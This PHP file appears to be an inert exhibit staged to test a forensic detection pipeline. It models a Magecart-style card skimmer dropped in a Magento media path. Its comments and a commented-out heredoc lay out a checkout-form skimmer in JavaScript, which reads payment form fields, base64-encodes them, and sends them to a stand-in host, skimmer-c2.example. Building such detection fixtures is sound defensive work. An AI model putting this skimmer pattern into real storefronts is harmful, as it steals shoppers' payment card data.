<?php
// staged exhibit — public Magecart family taxonomy — NOT customer data
//
// JS-skimmer dropper. Different family from PolyShell (host-2 / host-4 /
// host-7). The drop path here MATCHES the PolyShell convention
// (/var/www/html/pub/media/catalog/product/.cache/skimmer.php) so the
// fs_hunter fires the same `unusual_php_path` category and the case
// initially looks like the same campaign. The intent reconstructor (Day 4)
// then deobfuscates the artifact and reveals the family-marker divergence
// that drives the case-split decision in the orchestrator (P35).
//
// Family-marker divergence vs PolyShell (what intent.reconstruct surfaces):
//   - NO chr() ladder, NO 4-chunk base64 concatenation
//   - NO gzinflate / base64_decode chain
//   - NO $_POST['c'] command dispatch table
//   - NO callback to vagqea4wrlkdg.top — different C2 (skimmer-c2.example)
//   - Payload is client-side JavaScript injected into Magento checkout
//     templates, not server-side PHP eval
//   - Skimmer family targets payment data exfil (PCI-class), not server RCE
//
// The injected JavaScript is NON-FUNCTIONAL by design — it sits in a
// commented heredoc that does not execute. Inspecting the heredoc shows
// the pattern (event hook + form-data harvest + base64 + GET to
// /c.gif?d=<encoded>) without arming it.
//
// dormant-capability markers (commented for exhibit; DO NOT execute):
//   - JS injection : appends <script> to checkout/onepage/success template
//   - Event hook   : binds to Magento's `paymentMethodReady` event
//   - Form harvest : reads form#co-payment-form input values on submit
//   - Exfil        : GET https://skimmer-c2.example/c.gif?d=<base64-card-data>
//   - Persistence  : modifies app/design/frontend theme template (survives
//                    Magento cache flush; needs `bin/magento setup:upgrade`
//                    to revert)
$DORMANT_PAYLOAD = <<<'SKIM'
// (NOT EXECUTED — fenced inside heredoc; this is the family-pattern reference
//  for the intent reconstructor to deobfuscate and report on.)
//
// (function() {
//   if (typeof window === 'undefined' || !window.checkout) return;
//   window.checkout.on('paymentMethodReady', function() {
//     var f = document.querySelector('#co-payment-form');
//     if (!f) return;
//     f.addEventListener('submit', function(e) {
//       var d = {};
//       Array.prototype.forEach.call(f.elements, function(el) {
//         if (el.name) d[el.name] = el.value;
//       });
//       var b = btoa(JSON.stringify(d));
//       var img = new Image();
//       img.src = 'https://skimmer-c2.example/c.gif?d=' + encodeURIComponent(b);
//     }, true);
//   });
// })();
SKIM;

// Sentinel: prove this dropper does not execute under any input. The eval call
// in the PolyShell family is absent here. If a reader is checking armament
// status, the absence of any eval() / passthru() / file write is the answer.
echo "BL-STAGE skimmer.php inert (Magecart family reference) — see comments above";
?>
